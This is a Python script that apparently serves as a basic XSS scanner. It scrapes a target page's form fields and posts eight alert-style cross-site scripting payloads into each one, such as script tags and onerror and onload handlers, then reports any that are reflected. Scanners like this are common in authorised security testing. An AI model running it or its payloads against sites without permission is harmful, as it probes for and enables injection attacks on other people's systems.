import requests
from bs4 import BeautifulSoup
import html
from concurrent.futures import ThreadPoolExecutor

def get_input_fields(html_content):
    soup = BeautifulSoup(html_content, 'html.parser')
    input_fields = soup.find_all(['input', 'textarea', 'select', 'button'])
    return input_fields

def generate_payloads():
    payloads = [
        '<script>alert("XSS Vulnerability Found!");</script>',
        '<img src="x" onerror="alert(\'XSS Vulnerability Found!\')">',
        '"><script>alert("XSS Vulnerability Found!");</script>',
        '<svg/onload="alert(\'XSS Vulnerability Found!\')">',
        '"><img src=x onerror=alert(\'XSS Vulnerability Found!\')>',
        'javascript:alert("XSS Vulnerability Found!");',
        '"><iframe src="javascript:alert(\'XSS Vulnerability Found!\')">',
        '<video><source onerror="alert(\'XSS Vulnerability Found!\')">',

        # Add more payloads here as needed
    ]
    return payloads

def test_xss_payload(session, url, name, value, payload):
    modified_value = html.escape(value) + payload
    data = {name: modified_value}
    response = session.post(url, data=data)
    return payload in response.text

def test_xss_vulnerability(url):
    session = requests.Session()
    response = session.get(url)
    html_content = response.text

    input_fields = get_input_fields(html_content)
    payloads = generate_payloads()

    with ThreadPoolExecutor() as executor:
        futures = []

        for field in input_fields:
            name = field.get('name')
            input_type = field.get('type')
            value = field.get('value', '')

            for payload in payloads:
                future = executor.submit(test_xss_payload, session, url, name, value, payload)
                futures.append((future, name, input_type, payload))

        for future, name, input_type, payload in futures:
            if future.result():
                print(f"XSS Vulnerability found in {url}")
                print(f"Field: {name}, Input Type: {input_type}")
                print("Payload:", payload)
                print("------------------------------------------------")

if __name__ == "__main__":
    target_url = input("Enter the target URL: ")  # Accept the target URL as user input
    test_xss_vulnerability(target_url)
